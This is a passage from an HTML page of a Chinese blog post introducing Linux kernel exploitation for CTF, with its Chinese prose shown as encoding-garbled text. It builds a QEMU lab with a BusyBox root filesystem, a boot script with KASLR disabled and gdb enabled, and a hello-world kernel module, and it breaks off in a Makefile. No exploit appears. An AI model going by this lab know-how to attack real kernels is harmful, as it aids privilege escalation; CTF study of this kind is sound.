<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Kernel Pwn å…¥é—¨ - Humoooor&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Humoooor&#039;s Blog"><meta name="msapplication-TileImage" content="/img/MyLogo.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Humoooor&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="æœ¬æœºç¯å¢ƒä¸º Ubuntu 22.04 x86_64 é¦–å…ˆæ„Ÿè°¢ a3gg è®©æˆ‘ä»¬é¿å…å…¥é—¨ Kernel Pwn è·¯ä¸Šçš„å¾ˆå¤šå‘"><meta property="og:type" content="blog"><meta property="og:title" content="Kernel Pwn å…¥é—¨"><meta property="og:url" content="https://humoooor.cn/2023/08/20/Kernel%20Pwn%20%E5%85%A5%E9%97%A8/"><meta property="og:site_name" content="Humoooor&#039;s Blog"><meta property="og:description" content="æœ¬æœºç¯å¢ƒä¸º Ubuntu 22.04 x86_64 é¦–å…ˆæ„Ÿè°¢ a3gg è®©æˆ‘ä»¬é¿å…å…¥é—¨ Kernel Pwn è·¯ä¸Šçš„å¾ˆå¤šå‘"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://humoooor.cn/img/og_image.png"><meta property="article:published_time" content="2023-08-20T00:53:00.000Z"><meta property="article:modified_time" content="2023-10-04T11:52:38.050Z"><meta property="article:author" content="Humoooor"><meta property="article:tag" content="Linux Kernel"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://humoooor.cn/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://humoooor.cn/2023/08/20/Kernel%20Pwn%20%E5%85%A5%E9%97%A8/"},"headline":"Kernel Pwn å…¥é—¨","image":["https://humoooor.cn/img/og_image.png"],"datePublished":"2023-08-20T00:53:00.000Z","dateModified":"2023-10-04T11:52:38.050Z","author":{"@type":"Person","name":"Humoooor"},"publisher":{"@type":"Organization","name":"Humoooor's Blog","logo":{"@type":"ImageObject","url":"https://humoooor.cn/img/MyLogo.jpg"}},"description":"æœ¬æœºç¯å¢ƒä¸º Ubuntu 22.04 x86_64 é¦–å…ˆæ„Ÿè°¢ a3gg è®©æˆ‘ä»¬é¿å…å…¥é—¨ Kernel Pwn è·¯ä¸Šçš„å¾ˆå¤šå‘"}</script><link rel="canonical" href="https://humoooor.cn/2023/08/20/Kernel%20Pwn%20%E5%85%A5%E9%97%A8/"><link rel="icon" href="/img/MyLogo.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Humoooor's Blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/MyLogo.jpg" alt="Humoooor&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">é¦–é¡µ</a><a class="navbar-item" href="/archives">å½’æ¡£</a><a class="navbar-item" href="/categories">åˆ†ç±»</a><a class="navbar-item" href="/tags">æ ‡ç­¾</a><a class="navbar-item" href="/friends">å‹é“¾</a><a class="navbar-item" href="/about">å…³äº</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/humoooor"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="ç›®å½•" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="æœç´¢" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-08-20T00:53:00.000Z" title="2023/8/20 08:53:00">2023-08-20</time>å‘è¡¨</span><span class="level-item"><time dateTime="2023-10-04T11:52:38.050Z" title="2023/10/4 19:52:38">2023-10-04</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/Pwn/">Pwn</a></span><span class="level-item">19 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦2921ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile">Kernel Pwn å…¥é—¨</h1><div class="content"><p>æœ¬æœºç¯å¢ƒä¸º Ubuntu 22.04 x86_64</p>
<p>é¦–å…ˆæ„Ÿè°¢ a3gg è®©æˆ‘ä»¬é¿å…å…¥é—¨ Kernel Pwn è·¯ä¸Šçš„å¾ˆå¤šå‘</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="å®‰è£…ä¸€äº›ä¾èµ–åŒ…"><a href="#å®‰è£…ä¸€äº›ä¾èµ–åŒ…" class="headerlink" title="å®‰è£…ä¸€äº›ä¾èµ–åŒ…"></a>å®‰è£…ä¸€äº›ä¾èµ–åŒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt git fakeroot build-essential ncurses-dev xz-utils qemu-system-x86 flex libncurses5-dev libssl-dev bc bison libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev libelf-dev</span><br></pre></td></tr></table></figure>

<h3 id="è·å–å†…æ ¸é•œåƒ"><a href="#è·å–å†…æ ¸é•œåƒ" class="headerlink" title="è·å–å†…æ ¸é•œåƒ"></a>è·å–å†…æ ¸é•œåƒ</h3><p>å†…æ ¸é•œåƒä¸€èˆ¬ç§°ä¸º bzImage</p>
<p>è¿™é‡Œå‡†å¤‡ä¸‹è½½å·²ç¼–è¯‘å†…æ ¸é•œåƒ</p>
<ol>
<li>åˆ—å‡ºç‰ˆæœ¬å¯¹åº”å¯ä¸‹è½½å†…æ ¸é•œåƒ</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search linux-image | grep 5.19.0</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>é€‰ä¸€ä¸ªçœ‹ç€é¡ºçœ¼çš„ä¸‹è½½å°±è¡Œ</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt download linux-image-5.19.0-generic-41-generic</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>è§£å‹ä¸‹è½½çš„ deb æ–‡ä»¶</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X ./ linux-image-5.19.0-41-generic_5.19.0-41.42~22.04.1_amd64.deb</span><br></pre></td></tr></table></figure>

<p><code>./boot/vmlinuz-5.19.0-41-generic</code> å°±æ˜¯ bzImage é•œåƒæ–‡ä»¶</p>
<h3 id="ä½¿ç”¨-Busybox-æ„å»ºæ–‡ä»¶ç³»ç»Ÿ"><a href="#ä½¿ç”¨-Busybox-æ„å»ºæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨ Busybox æ„å»ºæ–‡ä»¶ç³»ç»Ÿ"></a>ä½¿ç”¨ Busybox æ„å»ºæ–‡ä»¶ç³»ç»Ÿ</h3><h4 id="ç¼–è¯‘-Busybox"><a href="#ç¼–è¯‘-Busybox" class="headerlink" title="ç¼–è¯‘ Busybox"></a>ç¼–è¯‘ Busybox</h4><p>BusyBox æ˜¯ä¸€ä¸ªé›†æˆäº†ä¸‰ç™¾å¤šä¸ªæœ€å¸¸ç”¨ Linux å‘½ä»¤å’Œå·¥å…·çš„è½¯ä»¶ï¼ŒåŒ…å«äº†ä¾‹å¦‚ lsã€cat å’Œ echo ç­‰ä¸€äº›ç®€å•çš„å·¥å…·ï¼ŒBusybox å¯ä»¥ä¸ºå†…æ ¸æä¾›ä¸€ä¸ªåŸºæœ¬çš„ç”¨æˆ·ç¯å¢ƒ</p>
<ol>
<li>è·å– Busybox æºç </li>
</ol>
<p>é€‰æ‹©ä¸€ä¸ªç¨³å®šç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ç¼–è¯‘</li>
</ol>
<p>è¿›å…¥é…ç½®é¡µé¢</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>å‹¾é€‰ <code>Settings</code> â€“&gt; <code>Build static binary file (no shared file)</code>ï¼Œè¿™æ ·ä¸ç”¨å•ç‹¬é…ç½® libcï¼Œç„¶åé€€å‡º</p>
<p>æ¥ä¸‹æ¥ç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆä¸€ä¸ª <code>_install</code> ç›®å½•ï¼Œç”¨æ¥æ„å»ºç£ç›˜é•œåƒ</p>
<h4 id="æ„å»ºæ–‡ä»¶ç³»ç»Ÿ"><a href="#æ„å»ºæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ„å»ºæ–‡ä»¶ç³»ç»Ÿ"></a>æ„å»ºæ–‡ä»¶ç³»ç»Ÿ</h4><ol>
<li>åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿ</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line"><span class="built_in">mkdir</span> -pv &#123;bin,sbin,etc,proc,sys,home,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line"><span class="built_in">touch</span> ./etc/inittab</span><br><span class="line"><span class="built_in">mkdir</span> ./etc/init.d</span><br><span class="line"><span class="built_in">touch</span> ./etc/init.d/rcS</span><br><span class="line"><span class="built_in">chmod</span> +x ./etc/init.d/rcS</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>é…ç½®åˆå§‹åŒ–è„šæœ¬</li>
</ol>
<p>é…ç½® <code>./etc/inttab</code>ï¼Œå†™å…¥ä¸‹é¢å†…å®¹ï¼ŒæŒ‡å®šç³»ç»Ÿåˆå§‹åŒ–è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS  </span><br><span class="line">::askfirst:/bin/ash  </span><br><span class="line">::ctrlaltdel:/sbin/reboot  </span><br><span class="line">::shutdown:/sbin/swapoff -a  </span><br><span class="line">::shutdown:/bin/umount -a -r  </span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>é…ç½® <code>./etc/init.d/rcS</code>ï¼ŒæŒ‚è½½å„ç§æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><figcaption><span>./etc/init.d/rcS</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>é…ç½®ç”¨æˆ·ç»„</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:x:0:0:root:/root:/bin/sh&quot;</span> &gt; etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot;</span> &gt;&gt; etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:x:0:&quot;</span> &gt; etc/group</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ctf:x:1000:&quot;</span> &gt;&gt; etc/group</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;none /dev/pts devpts gid=5,mode=620 0 0&quot;</span> &gt; etc/fstab</span><br></pre></td></tr></table></figure>

<h4 id="æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿä¸ºé•œåƒæ–‡ä»¶"><a href="#æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿä¸ºé•œåƒæ–‡ä»¶" class="headerlink" title="æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿä¸ºé•œåƒæ–‡ä»¶"></a>æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿä¸ºé•œåƒæ–‡ä»¶</h4><p>åœ¨ <code>_install</code> ç›®å½•ä¸‹æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../../rootfs.cpio</span><br></pre></td></tr></table></figure>

<h4 id="åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶"><a href="#åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶" class="headerlink" title="åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶"></a>åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶</h4><p>å¯ä»¥ç›´æ¥å‘ <code>_install</code> å†…æ·»åŠ ä¿®æ”¹ï¼Œä½†ä¼šæ¯”è¾ƒæ··ä¹±ï¼Œä¹Ÿå¯ä»¥è§£å‹æ–‡ä»¶ç³»ç»Ÿé•œåƒåå†æ‰“åŒ…</p>
<ol>
<li>è§£å‹æ–‡ä»¶ç³»ç»Ÿé•œåƒ</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idv &lt; ./rootfs.cpio</span><br></pre></td></tr></table></figure>

<p>å‘é‡Œé¢åŠ å…¥æƒ³è¦æ·»åŠ çš„æ–‡ä»¶å³å¯</p>
<ol start="2">
<li>é‡æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿé•œåƒ</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../new_rootfs.cpio</span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨-qemu-è¿è¡Œå†…æ ¸"><a href="#ä½¿ç”¨-qemu-è¿è¡Œå†…æ ¸" class="headerlink" title="ä½¿ç”¨ qemu è¿è¡Œå†…æ ¸"></a>ä½¿ç”¨ qemu è¿è¡Œå†…æ ¸</h3><p>å°† bzImage å’Œ rootfs.cpio æ”¾åˆ°åŒä¸€ä¸ªç›®å½•</p>
<p>ç¼–å†™å¯åŠ¨è„šæœ¬ boot.sh</p>
<figure class="highlight bash"><figcaption><span>boot.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr&quot;</span> \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-nographic \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure>

<p>éƒ¨åˆ†å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>-m</code>ï¼šè™šæ‹Ÿæœºå†…å­˜å¤§å°</li>
<li><code>-kernel</code>ï¼šå†…å­˜é•œåƒè·¯å¾„</li>
<li><code>-initrd</code>ï¼šç£ç›˜é•œåƒè·¯å¾„</li>
<li><code>-append</code>ï¼šé™„åŠ å‚æ•°é€‰é¡¹<ul>
<li><code>nokalsr</code>ï¼šå…³é—­å†…æ ¸åœ°å€éšæœºåŒ–ï¼Œæ–¹ä¾¿è°ƒè¯•</li>
<li><code>rdinit</code>ï¼šæŒ‡å®šåˆå§‹å¯åŠ¨è¿›ç¨‹ï¼Œ<code>/sbin/init</code> è¿›ç¨‹ä¼šé»˜è®¤ä»¥Â <code>/etc/init.d/rcS</code>Â ä½œä¸ºå¯åŠ¨è„šæœ¬</li>
<li><code>loglevel=3</code>Â &amp;Â <code>quiet</code>ï¼šä¸è¾“å‡º log</li>
<li><code>console=ttyS0</code>ï¼šæŒ‡å®šç»ˆç«¯ä¸º <code>/dev/ttyS0</code>ï¼Œè¿™æ ·ä¸€å¯åŠ¨å°±èƒ½è¿›å…¥ç»ˆç«¯ç•Œé¢</li>
</ul>
</li>
<li><code>-monitor</code>ï¼šå°†ç›‘è§†å™¨é‡å®šå‘åˆ°ä¸»æœºè®¾å¤‡ <code>/dev/null</code>ï¼Œè¿™é‡Œé‡å®šå‘è‡³ null ä¸»è¦æ˜¯é˜²æ­¢ CTF ä¸­è¢«äººç»™å·äº† qemu æ‹¿ flag</li>
<li><code>-cpu</code>ï¼šè®¾ç½® CPU å®‰å…¨é€‰é¡¹ï¼Œåœ¨è¿™é‡Œå¼€å¯äº† SMEP ä¿æŠ¤</li>
<li><code>-s</code>ï¼šç›¸å½“äº <code>-gdb tcp::1234</code> çš„ç®€å†™ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥è¿™ä¹ˆå†™ï¼‰ï¼Œåç»­å¯ä»¥é€šè¿‡ gdb è¿æ¥æœ¬åœ°ç«¯å£è¿›è¡Œè°ƒè¯•</li>
</ul>
<p>æ¥ä¸‹æ¥è¿è¡Œ boot.sh å³å¯æˆåŠŸè¿è¡Œ</p>
<h2 id="äº†è§£-LKM"><a href="#äº†è§£-LKM" class="headerlink" title="äº†è§£ LKM"></a>äº†è§£ LKM</h2><p>è™½ç„¶ Linux å†…æ ¸é‡‡ç”¨å®å†…æ ¸æ¶æ„ï¼Œä½†æ˜¯å†…æ ¸è£…è½½çš„å¾ˆå¤šæœåŠ¡å…¶å®å¾ˆå°‘ç”¨åˆ°ç”šè‡³ç”¨ä¸åˆ°ï¼Œä½†å®ƒä»¬ä¼šå æ®å¤§é‡å†…å­˜ç©ºé—´ï¼Œä¸”æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤æœåŠ¡å¾€å¾€è¦é‡æ–°ç¼–è¯‘æ•´ä¸ªå†…æ ¸ï¼Œæµªè´¹æ—¶é—´</p>
<p>å¯è£…è½½å†…æ ¸æ¨¡å—ï¼ˆLoadable Kernel Moduleï¼‰å› æ­¤å‡ºç°ï¼Œåœ¨å†…æ ¸ä¸­å®ƒå¯ä»¥è‡ªç”±åœ°è£…è½½æˆ–å¸è½½ï¼Œè€Œä¸ç”¨é‡æ–°ç¼–è¯‘ã€é‡å¯å†…æ ¸ï¼Œæé«˜äº†å†…æ ¸çš„å¯æ‹“å±•æ€§å’Œç»´æŠ¤æ€§ã€‚è€Œè®¾å¤‡é©±åŠ¨å°±æ˜¯å…¶ä¸­ä¸€ç§</p>
<p>CTF ä¸­çš„ kenrel pwn å¾€å¾€å°±æ˜¯é€šè¿‡ LKM çš„æ¼æ´æ¥æ§åˆ¶å†…æ ¸ï¼Œè€Œä¸æ˜¯ pwn å†…æ ¸ç»„ä»¶</p>
<h3 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h3><p>LKM åŒæ ·ä¹Ÿæ˜¯ ELF æ ¼å¼æ–‡ä»¶ï¼Œä½†ä¸èƒ½ç‹¬ç«‹è¿è¡Œï¼Œå¿…é¡»è£…è½½åœ¨å†…æ ¸ä¸­è¿è¡Œï¼Œå¹¶ä¸”ä¸Šä¸‹æ–‡ä¸ºå†…æ ¸ç©ºé—´</p>
<p>å› æ­¤ LKM ä¸èƒ½ä½¿ç”¨å…±äº«åº“ä¸­çš„å‡½æ•°ï¼Œä¹Ÿä¸èƒ½ç›´æ¥ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ï¼Œå®ƒå¿…é¡»ä½¿ç”¨å†…æ ¸æä¾›çš„å‡½æ•°ï¼Œåœ¨æŸç§æ„ä¹‰ä¸Šæ¥è¯´ LKM ç¼–ç¨‹ä¹Ÿæ˜¯å†…æ ¸ç¼–ç¨‹</p>
<h3 id="ç¼–å†™ä¸€ä¸ªç®€å•æ¨¡å—"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•æ¨¡å—" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å•æ¨¡å—"></a>ç¼–å†™ä¸€ä¸ªç®€å•æ¨¡å—</h3><figure class="highlight c"><figcaption><span>hello_kernel.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* hello_kernel.c</span></span><br><span class="line"><span class="comment">* developed by Humoooor</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">kernel_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello the Linux kernel world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">kernel_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; </span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Good bye the Linux kernel world! See you again!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kernel_module_init);</span><br><span class="line">module_exit(kernel_module_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Humoooor&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>å¤´æ–‡ä»¶<ul>
<li><code>linux/module.h</code>ï¼šLKM å¿…é¡»åŒ…å«</li>
<li><code>linux/kernel.h</code>ï¼šè½½å…¥å†…æ ¸ç›¸å…³ä¿¡æ¯</li>
<li><code>linux/init.h</code>ï¼šåŒ…å«ä¸€äº›å¸¸ç”¨çš„å®</li>
<li>ä¸€èˆ¬è¿™ä¸‰ä¸ªå¤´æ–‡ä»¶åœ¨ LKM ç¼–ç¨‹ä¸­éƒ½è¦ä½¿ç”¨</li>
</ul>
</li>
<li>LKM å…¥å£ç‚¹/å‡ºå£ç‚¹<ul>
<li><code>module_init</code>ï¼šå†…æ ¸è½½å…¥ LKM æ—¶ä¼šç¼ºçœè°ƒç”¨</li>
<li><code>module_exit</code>ï¼šå†…æ ¸å¸è½½ LKM æ—¶ä¼šç¼ºçœè°ƒç”¨</li>
</ul>
</li>
<li>å…¶ä»–<ul>
<li><code>__init</code> å’Œ <code>__exit</code>ï¼šåœ¨å‡½æ•°ç»“æŸåé‡Šæ”¾å¯¹åº”å†…å­˜</li>
<li><code>MODULE_LICENSE</code> å’Œ <code>MODULE_AUTHOR</code>ï¼šå£°æ˜ LKM ä½œè€…å’Œè®¸å¯è¯</li>
<li><code>printk</code>ï¼šå†…æ ¸å‡½æ•°ï¼Œå‘å†…æ ¸ç¼“å†²åŒºå†™å…¥ï¼Œ<code>&lt;1&gt;</code> è¡¨ç¤ºä¿¡æ¯çš„ç´§æ€¥çº§åˆ«ï¼ˆ8 ä¸ªä¼˜å…ˆçº§ï¼Œ0 ä¸ºæœ€é«˜ï¼‰</li>
</ul>
</li>
</ul>
<h3 id="ç¼–è¯‘-LKM"><a href="#ç¼–è¯‘-LKM" class="headerlink" title="ç¼–è¯‘ LKM"></a>ç¼–è¯‘ LKM</h3><p>ä¸€èˆ¬ä½¿ç”¨ Makefile æ¥ç¼–è¯‘ LKM</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m += hello_kernel.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL := <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">LINUX_KERNEL_PATH := /usr/src/linux-headers-<span class="variable">$(LINUX_KERNEL)</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span 